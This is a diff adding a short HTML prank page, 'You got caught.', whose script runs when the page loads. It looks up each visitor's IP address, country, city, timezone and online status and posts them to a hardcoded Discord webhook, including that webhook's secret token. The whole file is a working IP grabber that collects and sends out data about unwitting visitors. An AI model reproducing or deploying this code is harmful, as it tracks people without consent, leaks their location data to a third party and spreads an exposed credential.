@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>You got caught.</title>
+</head>
+<body>
+
+<h1>You got caught.</h1>
+<p>I accessed your IP information. (lol)</p>
+
+<script>
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const online = navigator.onLine ? "Online" : "Offline";
+
+  const message = {
+    content:
+      "アクセスログ\n" +
+      "IP: " + data.ip + "\n" +
+      "国: " + data.country_name + "\n" +
+      "都市: " + data.city + "\n" +
+      "タイムゾーン: " + timezone + "\n" +
+      "オンライン状態: " + online
+  };
+
+  fetch("https://discord.com/api/webhooks/1469960933756637225/qFtJWrxeQuzTXo4w3tGZHaZ97E6VWqay7u8fC2bqDNR9kwp_3s7khIJDa7gYdnLs98aQ", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(message)
+  });
+
+});
+</script>
+
+</body>
+</html>
